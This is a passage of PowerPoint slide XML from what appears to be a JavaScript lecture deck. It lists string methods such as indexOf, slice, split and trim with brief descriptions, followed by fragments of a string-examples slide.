              <a:t>charCodeAt(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>returns Unicode value of character at position </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>concat(v1, v2, …) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>concatenate one or more strings </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>v1, v2…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>endsWith</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0" err="1"/>
              <a:t>searchString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>returns true if string ends with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>searchString</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>String.fromCharCode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0"/>
              <a:t>c1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0"/>
              <a:t> c2, …</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>returns a string created from a specified sequence of Unicode values </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>c1, c2…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>includes(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0" err="1"/>
              <a:t>searchString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>returns true if </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>searchString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> is found within string</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>indexOf(substr, [start]) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>returns index of first match of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>substr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> starting from index </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (returns -1 if not found)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>lastIndexOf(substr, [start]) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>returns index of last match of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>substr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> starting from index </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (returns -1 if not found)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>match(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0" err="1"/>
              <a:t>regexp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>return array of information of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>regexp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> match or null if no match is found</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>matchAll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0" err="1"/>
              <a:t>regexp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>method returns an iterator of all results matching a string against a regular expression </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>regexp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>, including capturing groups.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32771" name="Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D2EE74C1-6FCD-43E8-A681-8B6359F6CFE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>String Methods</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t> C-M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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2C0989A1-EF87-445E-BD57-3597455BEBB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>String Methods R-S</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33795" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3528D05E-E625-4BAA-9DA6-C01148FCC638}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>repeat(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0"/>
              <a:t>count</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>constructs and returns a new string which contains the specified </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>count </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>number of copies of the string on which it was called, concatenated together.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>replace(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0" err="1"/>
              <a:t>regexp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="1" dirty="0"/>
              <a:t>replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>returns a new string where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>regexp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> pattern is replaced with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" i="1" dirty="0"/>
              <a:t>replace </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>text</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>search(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" i="1" dirty="0" err="1"/>
              <a:t>regexp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>returns index of the match or -1 if not found</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" b="1" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>slice(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" i="1" dirty="0"/>
              <a:t>start, [end]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>returns characters between </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>start </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>end </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>indexes, not including </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>end</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>. If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>end </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>is not specified, end is assumed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>split(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" i="1" dirty="0"/>
              <a:t>delimiter, [limit]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>)  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>splits the string according to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>delimiter </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>into many substrings (max </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>limit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>), returning an array of strings</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>startsWith</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" i="1" dirty="0" err="1"/>
              <a:t>searchString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>returns true if string starts with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0" err="1"/>
              <a:t>searchString</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>substr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" i="1" dirty="0"/>
              <a:t>from, [length]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>returns </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>length </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>characters starting from index. If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>length </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>is not specified, all characters to end</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>substring(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" i="1" dirty="0"/>
              <a:t>from, [to]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>returns characters between </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>indexes, not including </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>. If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>is not specified, end is assumed (identical to slice)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="20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46E0747-5D76-43FC-B1DC-763E8DC781B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>String Methods T</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05A14B7F-EFC9-494B-BE7B-CE0C0D537F95}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" b="1" dirty="0" err="1"/>
              <a:t>toLowerCase</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" b="1" dirty="0"/>
              <a:t>() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" dirty="0"/>
              <a:t>returns the string with all its characters converted to lowercase</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="3200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" b="1" dirty="0" err="1"/>
              <a:t>toUpperCase</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" b="1" dirty="0"/>
              <a:t>() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" dirty="0"/>
              <a:t>returns the string with all its characters converted to uppercase</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" b="1" dirty="0"/>
              <a:t>trim() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" dirty="0"/>
              <a:t>removes whitespace from both ends of a string. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" b="1" dirty="0" err="1"/>
              <a:t>trimEnd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" b="1" dirty="0"/>
              <a:t>() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" dirty="0"/>
              <a:t>removes whitespace from the end of a string.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" b="1" dirty="0" err="1"/>
              <a:t>trimStart</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" b="1" dirty="0"/>
              <a:t>() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="3200" dirty="0"/>
              <a:t>removes whitespace from the beginning of a string. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="285885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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D0D470C4-ED0B-4F91-94DF-49EEF7A34F24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>String Examples</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34819" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{344EB66B-3F8F-4086-A15E-59260CBF712B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1600200"/>
            <a:ext cx="8229600" cy="4924425"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"this is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>easy</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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n</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0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>length</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n = 12</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e</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charAt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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charAt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>8</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e='he';</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795E26"/>
                </a:solidFill>
                <a:effectLst/>
